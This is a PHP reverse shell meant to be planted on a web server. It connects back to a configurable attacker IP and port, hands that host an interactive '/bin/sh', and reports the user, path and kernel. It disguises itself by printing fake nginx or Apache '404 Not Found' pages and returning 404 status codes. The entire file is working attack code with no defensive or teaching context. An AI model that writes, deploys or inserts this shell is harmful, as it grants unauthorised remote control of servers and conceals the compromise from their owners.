<?php
  set_time_limit (0);
  error_reporting(0);

  #------------------------------------------------------------------#
  # Configurable Settings
  #------------------------------------------------------------------#
  $ip = 'localhost';    // To be modified
  $port = 4445;         // To be modified
  $stealth = 1;         // Optional
  #------------------------------------------------------------------#

  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;

  if(strpos($_SERVER["SERVER_SOFTWARE"], "nginx") !== false) {
?>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<?php
  }
  if(strpos($_SERVER["SERVER_SOFTWARE"], "Apache") !== false) {
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /<?php echo basename(__FILE__); ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>

<?php
  }

  $information = "echo -------------------------------------------------------------------------\n 
          echo '[+] Username:' `whoami`\n
          echo '[+] Path    :' `pwd`\n
          echo '[+] Kernel  :' `uname -r`\n
          echo -------------------------------------------------------------------------\n
          echo \n
  ";

  $shell = 'export TERM=xterm; clear; ' . $information . ' /bin/sh +m -i';
  $daemon = 0;
  $debug = 0;

  if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }

    if ($pid) {
      exit(0);
    }

    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  umask(0);

  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
                if ($stealth) {
                   http_response_code(404);
                }
    exit(1);
  }

  $descriptorspec = array(
     0 => array("pipe", "r"),
     1 => array("pipe", "w"),
     2 => array("pipe", "w")
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

    http_response_code(404);

  function printit ($string) {
    if (!$daemon) {
      if (!$stealth = 1) {
        print "<pre>$string\n</pre>";
      }
    }
  }
  ?>
